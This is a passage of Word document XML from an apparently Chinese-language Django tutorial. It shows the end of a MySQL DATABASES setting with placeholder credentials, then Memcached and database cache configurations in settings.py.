          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'NAME': 'mydb',         # 你要存储数据的库名，事先要创建之</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE43D9C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'USER': 'xxs',         # 数据库用户名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4F6335" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'PASSWORD': 'xxxx',     # 密码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB01E70" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'HOST': 'localhost',    # 主机</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56632F78" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'PORT': '3306',         # 数据库使用的端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE8B4D0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669974AF" w14:textId="3620FF23" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281E39BD" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">更多阅读: </w:t>
      </w:r>
      <w:hyperlink r:id="rId290" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>2019新年第一篇: SQLite的优缺点及Django配置MySQL数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2A99CB2C" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="691423B5" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>缓存设置（CACHE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44AAD6F5" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django中提供了多种缓存方式，如果要使用缓存，需要先在settings.py中进行配置，然后应用。根据缓存介质的不同，你需要设置不同的缓存后台Backend。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690546AC" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A75343E" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Memcached缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D61D663" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Memcached是基于内存的缓存，Django原生支持的最快最有效的缓存系统。对于大多数场景，我们推荐使用Memcached，数据缓存在服务器端。使用前需要通过pip安装memcached的插件python-memcached和pylibmc，可以同时支持多个服务器上面的memcached。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6A5FB8" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34E6E1D2" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下面是使用pyhon-memcached的设置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49386B35" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t># localhost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFFD86A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486B2B36" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5DBEED" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7662B786" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'LOCATION': '127.0.0.1:11211',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABF5A55" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A39BA18" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3681E8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DA9F62C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># unix soket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3365FF93" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC8187A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BDF393" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C67908A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'LOCATION': 'unix:/tmp/memcached.sock',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5D40F6" w14:textId="6A3633A1" w:rsidR="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43969CC8" w14:textId="3691C60E" w:rsidR="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">}   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411613A2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE87830" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651B48CD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34203336" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'LOCATION': [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E71A689" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            '172.19.26.240:11211',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454B3022" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            '172.19.26.242:11211',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5725AAA4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1914553B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 我们也可以给缓存机器加权重，权重高的承担更多的请求，如下</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C5A6CF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'LOCATION': [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFD917A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            ('172.19.26.240:11211',5),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E913BA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            ('172.19.26.242:11211',1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037038C4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E91EFBD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC96A80" w14:textId="033E7818" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2907AC82" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>数据库缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D836C4D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B244C7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D2CF33" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
